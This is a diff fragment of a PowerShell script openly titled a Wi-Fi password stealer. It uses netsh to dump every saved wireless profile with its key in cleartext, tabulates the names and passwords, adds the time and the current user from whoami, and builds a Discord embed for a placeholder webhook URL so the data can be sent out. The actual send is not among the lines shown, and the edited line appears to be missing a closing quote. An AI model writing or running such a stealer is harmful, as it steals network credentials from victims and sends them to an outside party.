@@ -1,6 +1,6 @@
 $webhookUrl = "discord webhook url"
 $content = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
-$content = $content+"`n`nTime: $(Get-Date)`nPC Name: $env:computername"
+$content = $content+"`n`nTime: $(Get-Date)`nUser: $(whoami)
 [System.Collections.ArrayList]$embedArray = @()
 $title       = 'Wi-Fi Password Stealer Powershell'
 $description = '```'+$content+'```'
